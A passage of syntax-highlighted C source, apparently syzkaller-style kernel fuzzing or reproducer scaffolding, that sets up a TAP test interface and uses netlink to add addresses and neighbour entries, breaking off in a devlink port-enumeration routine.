<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifa_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">dev</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">RTM_NEWADDR</span><span class="p">,</span><span class="w"> </span><span class="n">NLM_F_CREATE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NLM_F_REPLACE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFA_LOCAL</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">addrsize</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFA_ADDRESS</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">addrsize</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_addr4</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span>
<span class="w">                              </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="w"> </span><span class="n">in_addr</span><span class="p">;</span>
<span class="w">  </span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in_addr</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_add_addr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in_addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">in_addr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_addr6</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span>
<span class="w">                              </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="w"> </span><span class="n">in6_addr</span><span class="p">;</span>
<span class="w">  </span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in6_addr</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_add_addr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in6_addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">in6_addr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_neigh</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                              </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">addrsize</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">mac</span><span class="p">,</span>
<span class="w">                              </span><span class="kt">int</span><span class="w"> </span><span class="n">macsize</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">ndmsg</span><span class="w"> </span><span class="n">hdr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ndm_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addrsize</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">AF_INET</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">AF_INET6</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ndm_ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ndm_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NUD_PERMANENT</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">RTM_NEWNEIGH</span><span class="p">,</span><span class="w"> </span><span class="n">NLM_F_EXCL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NLM_F_CREATE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NDA_DST</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">addrsize</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NDA_LLADDR</span><span class="p">,</span><span class="w"> </span><span class="n">mac</span><span class="p">,</span><span class="w"> </span><span class="n">macsize</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">tunfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>

<span class="cp">#define TUN_IFACE &quot;syz_tun&quot;</span>
<span class="cp">#define LOCAL_MAC 0xaaaaaaaaaaaa</span>
<span class="cp">#define REMOTE_MAC 0xaaaaaaaaaabb</span>
<span class="cp">#define LOCAL_IPV4 &quot;172.20.20.170&quot;</span>
<span class="cp">#define REMOTE_IPV4 &quot;172.20.20.187&quot;</span>
<span class="cp">#define LOCAL_IPV6 &quot;fe80::aa&quot;</span>
<span class="cp">#define REMOTE_IPV6 &quot;fe80::bb&quot;</span>

<span class="cp">#define IFF_NAPI 0x0010</span>

<span class="c1">// 初始化一个TUN设备，用于模拟网络接口</span>
<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initialize_tun</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">tunfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/net/tun&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDWR</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_NONBLOCK</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tunfd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;tun: can&#39;t open /dev/net/tun: please enable CONFIG_TUN=y</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;otherwise fuzzing or reproducing might not work as intended</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">kTunFd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">200</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">tunfd</span><span class="p">,</span><span class="w"> </span><span class="n">kTunFd</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">tunfd</span><span class="p">);</span>
<span class="w">  </span><span class="n">tunfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kTunFd</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">ifreq</span><span class="w"> </span><span class="n">ifr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ifr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifr</span><span class="p">));</span>
<span class="w">  </span><span class="n">strncpy</span><span class="p">(</span><span class="n">ifr</span><span class="p">.</span><span class="n">ifr_name</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="n">IFNAMSIZ</span><span class="p">);</span>
<span class="w">  </span><span class="n">ifr</span><span class="p">.</span><span class="n">ifr_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IFF_TAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">IFF_NO_PI</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">tunfd</span><span class="p">,</span><span class="w"> </span><span class="n">TUNSETIFF</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ifr</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">sysctl</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">sysctl</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/proc/sys/net/ipv6/conf/%s/accept_dad&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">);</span>
<span class="w">  </span><span class="n">write_file</span><span class="p">(</span><span class="n">sysctl</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;0&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">sysctl</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/proc/sys/net/ipv6/conf/%s/router_solicitations&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">);</span>
<span class="w">  </span><span class="n">write_file</span><span class="p">(</span><span class="n">sysctl</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;0&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_ROUTE</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_addr4</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="n">LOCAL_IPV4</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_addr6</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="n">LOCAL_IPV6</span><span class="p">);</span>
<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">macaddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">REMOTE_MAC</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="w"> </span><span class="n">in_addr</span><span class="p">;</span>
<span class="w">  </span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">REMOTE_IPV4</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in_addr</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_neigh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in_addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">in_addr</span><span class="p">),</span>
<span class="w">                    </span><span class="o">&amp;</span><span class="n">macaddr</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="w"> </span><span class="n">in6_addr</span><span class="p">;</span>
<span class="w">  </span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span><span class="w"> </span><span class="n">REMOTE_IPV6</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in6_addr</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_neigh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">in6_addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">in6_addr</span><span class="p">),</span>
<span class="w">                    </span><span class="o">&amp;</span><span class="n">macaddr</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">);</span>
<span class="w">  </span><span class="n">macaddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LOCAL_MAC</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">TUN_IFACE</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">macaddr</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">,</span>
<span class="w">                        </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define DEVLINK_FAMILY_NAME &quot;devlink&quot;</span>

<span class="cp">#define DEVLINK_CMD_PORT_GET 5</span>
<span class="cp">#define DEVLINK_ATTR_BUS_NAME 1</span>
<span class="cp">#define DEVLINK_ATTR_DEV_NAME 2</span>
<span class="cp">#define DEVLINK_ATTR_NETDEV_NAME 7</span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="w"> </span><span class="n">nlmsg2</span><span class="p">;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initialize_devlink_ports</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">bus_name</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev_name</span><span class="p">,</span>
<span class="w">                                     </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">netdev_prefix</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">genlmsghdr</span><span class="w"> </span><span class="n">genlhdr</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">total_len</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">err</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">netdev_index</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_GENERIC</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">rtsock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_ROUTE</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rtsock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_query_family_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">DEVLINK_FAMILY_NAME</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">error</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">genlhdr</span><span class="p">.</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DEVLINK_CMD_PORT_GET</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">NLM_F_DUMP</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">DEVLINK_ATTR_BUS_NAME</span><span class="p">,</span><span class="w"> </span><span class="n">bus_name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">bus_name</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">DEVLINK_ATTR_DEV_NAME</span><span class="p">,</span><span class="w"> </span><span class="n">dev_name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">dev_name</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send_ext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">total_len</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">error</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="n">netdev_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_next_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">total_len</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)(</span><span class="n">nlmsg</span><span class="p">.</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NLMSG_HDRLEN</span><span class="w"> </span><span class="o">+</span>
<span class="w">                                           </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">)));</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(;</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">attr</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">.</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
<span class="w">         </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">attr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_len</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">DEVLINK_ATTR_NETDEV_NAME</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">port_name</span><span class="p">;</span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">netdev_name</span><span class="p">[</span><span class="n">IFNAMSIZ</span><span class="p">];</span>
<span class="w">        </span><span class="n">port_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">attr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">        </span><span class="n">snprintf</span><span class="p">(</span><span class="n">netdev_name</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">netdev_name</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;%s%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">netdev_prefix</span><span class="p">,</span>
